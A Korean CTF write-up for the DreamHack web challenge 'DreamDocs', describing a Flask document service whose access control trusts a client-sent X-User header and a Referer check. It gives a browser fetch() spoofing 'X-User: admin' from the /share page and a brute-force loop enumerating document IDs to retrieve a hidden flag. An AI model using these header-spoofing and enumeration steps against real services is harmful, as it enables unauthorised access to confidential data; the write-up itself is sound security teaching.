---
title: "[DreamHack] DreamDocs"
date: 2026-04-08 00:30:00 +0900
categories: [CTF/Wargame]
tags: [ctf, web, DreamHack]
---

# 드림핵 CTF 문제 풀이

## 0. 개요

- **문제 이름** : DreamDocs
- **문제 유형** : Web  
- **환경** : 
  - Flask 기반 문서 서비스  
  - /api/docs -> 문서 목록 제공  
  - /doc/<id> -> 문서 조회  
  - /share -> 접근 허용 기준 페이지  
- **목표** :
  - **confidential 문서에 접근하여 HTML 내부에 숨겨진 FLAG를 획득한다.** 

---

## 1. 전체 구조 분석

### 1-1. 서비스 구조

서비스는 다음과 같은 흐름으로 동작한다.  

Client -> /api/docs -> 문서 목록 확인 -> /doc/<id> -> 문서 내용 조회  

문서 데이터는 서버 메모리(documents)에 저장되어 있으며,   
특정 문서에는 FLAG가 포함되어 있다.  

---

### 1-2. 플래그 위치

코드를 보면 FLAG는 다음 위치에 존재한다.  

```python
'content': f'... <!-- FLAG: {FLAG} --> ...'
```
 
즉, 플래그는 HTML 주석 형태로 문서 내부에 포함되어 있다.  

---

### 1-3. 접근 제어 로직 

문서 접근 시 다음 조건이 존재한다.  

```python
if '/share' not in referer:
return 403

if document['classification'] == 'confidential':
if user_level != 'admin':
return 403
```

즉, 조건은 다음 두가지다.  
1. Referer에 /share 포함
2. X-User: admin

이 두 조건을 만족하면 confidential 문서 접근 가능  

---

## 2. 취약점 분석

### 2-1. 헤더 기반 인증 취약점

user_level = request.headers.get('X-User', 'guest')  

권한을 헤더로 판단. 즉, 다음과 같이 보내면:  
  
X-User: admin  

누구나 admin 권한 획득 가능  

--- 

### 2-2. Referer 기반 접근 제어

if '/share' not in referer:  

Referer 포함 여부로 접근 제어  
  
하지만 Referer는:  
- 클라이언트가 제어 가능
- 신뢰 불가능한 값

즉, **완전히 우회 가능한 로직**

---

### 2-3. 취약점 정리  

이 문제의 포인트는 두 가지다.  
- X-User 헤더 신뢰 -> 권한 상승
- Referer 검사 -> 접근 제어 우회 가능

둘을 동시에 만족시키면 끝.

---

## 3. 공격 시나리오

### 3-1. 대상 문서 탐색

먼저 /api/docs를 확인한다. 

```python
[
{ "id": 227, "classification": "confidential", ... }
]
```

confidential 문서 발견 -> 타겟 선정  

--- 

### 3-2. 직접 접근 실패

GET /doc/227  

결과:  
Access Denied  
- Referer 조건 미충족

---

### 3-3. 해결 아이디어 

핵심 아이디어:  
**브라우저가 자동으로 Referer 를 붙이게 만든다.**  

---

### 3-4. Referer 우회 방법

브라우저에서 /share 페이지를 열고  
DevTools 콘솔에서 실행하면 자동으로 Referer가 /share로 설정된다.  

```python
fetch('/doc/227', {
headers: {
'X-User': 'admin'
}
})
```

---

### 3-5. 실행 흐름

이 요청은 실제로 다음과 같이 동작한다.  

```python
GET /doc/227
Referer: http://127.0.0.1:3333/share
X-User: admin
```

두 조건 모두 만족  

--- 

### 3-6. 결과

서버가 문서를 반환하고  
HTML 내부에 다음이 포함된다.  

```python
<!-- FLAG: DH{...} -->
```

---

### 3-7. 플래그 추출

정규식을 이용해서 추출한다. 

```python
const m = txt.match(/DH\{[\s\S]*?\}/);
```

FLAG만 추출 가능  

---

## 4. 자동화 (Brute Force)

confidential 문서 ID를 모르는 경우:

```python
for (let i = 100; i < 1000; i++) {
fetch(`/doc/${i}`, {
headers: { "X-User": "admin" }
})
.then(r => r.text())
.then(txt => {
if (txt.includes("confidential")) {
console.log(i, txt);
}
});
}
```

전체 ID 범위 탐색 기능

--- 

## 5. 전체 공격 흐름 정리

전체 익스플로잇은 다음 단계로 구성된다.  
1. /api/docs에서 confidential 문서 ID 확인
2. /doc/<id> 직접 접근 -> 실패
3. /share 페이지에서 요청 발생
4. 브라우저 자동 Referer 설정
5. X-User: admin 헤더 삽입
6. 문서 HTML 응답 획득
7. 정규식으로 FLAG 추출

---

## 6. 포인트

이 문제의 포인트는 다음이다.  
- 클라이언트 헤더를 신뢰하면 안된다.
- Referer 기반 인증은 취약하다.
- 브라우저 동작을 이용하면 쉽게 우회 가능

---

## 7. 정리

Referer 기반 접근 제어와 헤더 기반 권한 검증을 동시에 우회하여   
confidential 문서에 접근하고,   
HTML 주석에 숨겨진 FLAG를 획득하는 문제  

---
